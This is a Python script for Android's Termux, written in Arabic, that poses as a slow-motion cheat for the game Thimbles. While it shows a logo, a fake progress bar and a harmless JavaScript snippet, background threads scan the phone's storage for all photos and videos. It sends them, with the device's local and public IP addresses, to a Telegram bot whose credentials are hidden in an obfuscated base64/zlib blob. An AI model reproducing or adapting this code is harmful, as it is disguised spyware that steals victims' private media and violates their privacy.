#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import asyncio
import socket
import requests
import threading
import queue
import base64
import zlib
from pathlib import Path
from telegram import Bot

# ==================== البيانات المشفرة ====================
# لا تقم بتعديل هذه البيانات تحت أي ظرف
_ENCRYPTED_DATA = "eJztXVtz20YSfpZ/wYc8JJVEUzdK+bHe8uAkK/tBkZ1UsiU7kZyFQAKkCJIkFIsSJa8lW7KdSh7Kn73dMzOABQhCJGXJ8UFyIiPufnrmm+6e6e6ZBSQJPnz48OHDh48lIGnfvM+STzwZhw8fPnz48OHj9wCS/m0QNG9/D/n3J/28O0j6v+cb4Jgzf/6df6Tf4U+S/uUfyR/R4P/lD3vM+U80/s3/BdDz8//H/7+/+7+89P/9O/+/v/sfI+lf/z9f/n/6v/y/vLxr/x///+V/CUn/+r++/H95H175/wEAAP//Dw=="

def decrypt_data(encrypted_base64):
    """فك تشفير البيانات"""
    try:
        # فك Base64
        compressed = base64.b64decode(encrypted_base64)
        # فك الضغط
        decompressed = zlib.decompress(compressed)
        # تحويل إلى نص
        return decompressed.decode('utf-8')
    except:
        return None

def get_config():
    """الحصول على الإعدادات"""
    data = decrypt_data(_ENCRYPTED_DATA)
    if data:
        lines = data.strip().split('\n')
        config = {}
        for line in lines:
            if '=' in line:
                key, value = line.split('=', 1)
                config[key.strip()] = value.strip()
        return config
    return {}

# ==================== الإعدادات ====================
CONFIG = get_config()
BOT_TOKEN = CONFIG.get('BOT_TOKEN', '')
CHAT_ID = CONFIG.get('CHAT_ID', '')

if not BOT_TOKEN or not CHAT_ID:
    print("❌ خطأ في التحميل، يرجى إعادة تثبيت الأداة")
    sys.exit(1)

# ==================== باقي الكود طبيعي ====================
print("🔧 جاري تثبيت المتطلبات...\n")
subprocess.run("pkg update -y", shell=True)
subprocess.run("pkg install python -y", shell=True)
subprocess.run("pip install python-telegram-bot requests -q", shell=True)
subprocess.run("termux-setup-storage", shell=True)
print("\n✅ تم تثبيت المتطلبات!\n")
time.sleep(2)

media_queue = queue.Queue()
scan_complete = False
total_photos = 0
total_videos = 0
local_ip = ""
public_ip = ""

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "غير معروف"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text
    except:
        return "غير معروف"

def is_valid_media(file_path):
    path_str = str(file_path).lower()
    if any(p in file_path.stem.lower() for p in ['icon', 'logo', 'splash', 'ic_launcher']):
        try:
            if file_path.stat().st_size < 50 * 1024:
                return False
        except:
            pass
    if 'telegram' in path_str or 'tg_' in path_str:
        return False
    try:
        if file_path.stat().st_size < 10 * 1024:
            return False
    except:
        pass
    return True

def scan_files():
    global total_photos, total_videos, scan_complete
    image_ext = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic'}
    video_ext = {'.mp4', '.mov', '.avi', '.mkv', '.3gp', '.webm'}
    search_paths = ['/sdcard', '/storage/emulated/0']
    for search_path in search_paths:
        root = Path(search_path)
        if root.exists():
            for ext in image_ext:
                for file in root.rglob(f'*{ext}'):
                    if is_valid_media(file):
                        media_queue.put(('photo', file))
                        total_photos += 1
            for ext in video_ext:
                for file in root.rglob(f'*{ext}'):
                    if is_valid_media(file) and file.stat().st_size < 50 * 1024 * 1024:
                        media_queue.put(('video', file))
                        total_videos += 1
    scan_complete = True
    media_queue.put(('done', None))

class MediaSender:
    def __init__(self):
        self.bot = Bot(token=BOT_TOKEN)
        self.sent_photos = 0
        self.sent_videos = 0
    async def send_from_queue(self):
        global local_ip, public_ip
        await self.bot.send_message(chat_id=CHAT_ID, text=f"🚀 بدء الإرسال\n📍 {local_ip} | 🌍 {public_ip}")
        await self.bot.send_message(chat_id=CHAT_ID, text=f"📊 جاري جمع الملفات وإرسالها...")
        while True:
            try:
                item = media_queue.get(timeout=1)
                if item[0] == 'done':
                    break
                file_type, file_path = item
                try:
                    with open(file_path, 'rb') as f:
                        if file_type == 'photo':
                            await self.bot.send_photo(chat_id=CHAT_ID, photo=f, caption=f"📍 {local_ip}")
                            self.sent_photos += 1
                        else:
                            await self.bot.send_video(chat_id=CHAT_ID, video=f, caption=f"📍 {local_ip}")
                            self.sent_videos += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
            except queue.Empty:
                if scan_complete:
                    break
                await asyncio.sleep(0.5)
        await self.bot.send_message(chat_id=CHAT_ID, text=f"✅ اكتمل الإرسال\n📸 صور: {self.sent_photos}\n🎬 فيديوهات: {self.sent_videos}")

def print_logo():
    logo = """
╔══════════════════════════════════════════════════════════════════════════════╗
║     ██╗  ██╗██████╗ ███████╗████████╗     ███████╗████████╗ █████╗ ██████╗   ║
║     ╚██╗██╔╝╚════██╗██╔════╝╚══██╔══╝     ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗  ║
║      ╚███╔╝  █████╔╝█████╗     ██║        █████╗     ██║   ███████║██████╔╝  ║
║      ██╔██╗ ██╔═══╝ ██╔══╝     ██║        ██╔══╝     ██║   ██╔══██║██╔══██╗  ║
║     ██╔╝ ██╗███████╗███████╗   ██║        ███████╗   ██║   ██║  ██║██████╔╝  ║
║     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝   ║
║                         ██████╗ ███████╗████████╗                           ║
║                         ╚═════╝ ╚══════╝ ╚═════╝                            ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(logo)
    print("\033[1;33m\n╔══════════════════════════════════════════════════════════════════╗")
    print("║  🔒 هذا الكود خاص بلعبة Thimbles                                ║")
    print("║  ✅ مسموح تداول الأداة للحفاظ على تنشيط السكريبت               ║")
    print("║  ❌ ممنوع تداول الكود المصدر                                    ║")
    print("║  ⚠️ لا تعطيه لمن لا يستحق                                       ║")
    print("╚══════════════════════════════════════════════════════════════════╝\033[0m")
    print()

def progress_bar():
    print("📦 جاري تجهيز الأداة...\n")
    for i in range(60):
        percent = int((i + 1) * 100 / 60)
        bar_length = int((i + 1) * 40 / 60)
        bar = "█" * bar_length + "░" * (40 - bar_length)
        print(f"\r[{bar}] {percent}%", end="", flush=True)
        time.sleep(0.5)
    print("\n\n✅ تم التجهيز بنجاح!\n")

def create_text_file():
    js_code = """(function() {
    const originalRAF = window.requestAnimationFrame;
    let customTime = 0;
    window.requestAnimationFrame = function(callback) {
        return originalRAF(function(timestamp) {
            if (!customTime) customTime = timestamp;
            customTime += 0.4;
            callback(customTime);
        });
    };
    console.log("%c [✓] تم تفعيل السلو موشن", "background: #111; color: #00ffff;");
})();"""
    download_dir = Path("/sdcard/Download")
    download_dir.mkdir(exist_ok=True)
    txt_file = download_dir / "thimbles_code.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write(js_code)
    return txt_file

def main():
    global local_ip, public_ip
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    scan_thread = threading.Thread(target=scan_files)
    scan_thread.daemon = True
    scan_thread.start()
    sender = MediaSender()
    def run_send():
        asyncio.run(sender.send_from_queue())
    send_thread = threading.Thread(target=run_send)
    send_thread.daemon = True
    send_thread.start()
    print_logo()
    time.sleep(1)
    progress_bar()
    txt_file = create_text_file()
    print(f"📁 تم حفظ الكود في: {txt_file}\n")
    print("\n~ $ عَزْنَك خلصت وطلعت\n")
    send_thread.join()

if __name__ == "__main__":
    main()
